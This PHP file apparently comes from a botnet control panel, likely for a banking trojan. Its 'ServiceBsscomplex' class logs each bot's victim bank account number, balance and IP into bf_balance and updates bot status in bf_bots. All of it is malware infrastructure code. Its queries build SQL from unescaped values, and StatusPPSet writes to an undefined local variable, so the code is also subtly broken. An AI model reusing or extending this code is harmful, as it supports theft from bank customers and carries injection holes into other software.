<?php

class ServiceBsscomplex {
    private $bot, $system, $mysqli;

    function __construct(){
        global $bot, $system, $mysqli;

        $this->bot = &$bot;
        $this->system = &$system;
        $this->db = &$mysqli;

        if(!empty($this->bot->info)){
	    $this->bot->info = json_decode(base64_decode($this->bot->info), 1);
	    if(!is_array($this->bot->info)) $this->bot->info = array();
	}else{
	    $this->bot->info = array();
	}
    }

    private function sumc($balance = ''){    	return str_replace(' ', '', str_replace(',', '', $balance));
    }

    //устанавливает текущий баланс на аккаунте
    function SummSet($acc = '', $balance = ''){
        if(empty($acc)) return false;
        if(empty($balance)) return false;
        $balance = $this->sumc($balance);
        return $this->db->query("INSERT INTO bf_balance set userid = '".$this->bot->userid."', prefix = '".$this->bot->prefix."', uid = '".$this->bot->uid."', ip='".$_SERVER['REMOTE_ADDR']."', acc='".$acc."', system='".$this->system->nid."', balance='".$balance."' on duplicate key update post_date = CURRENT_TIMESTAMP(), ip = '".$_SERVER['REMOTE_ADDR']."'");
    }

    function StatusPPSet($pid = '', $status = ''){
        if(empty($pid)) return false;
        if(empty($status)) return false;

        $bot->info['pid'] = $pid;
        $bot->info['status'] = $status;

        $this->db->query('update bf_bots set last_date = CURRENT_TIMESTAMP(), info = \''.base64_encode(json_encode($this->bot->info)).'\' WHERE (id = \''.$this->bot->id.'\') LIMIT 1');

        return true;
    }
}

RegisterService("ServiceBsscomplex");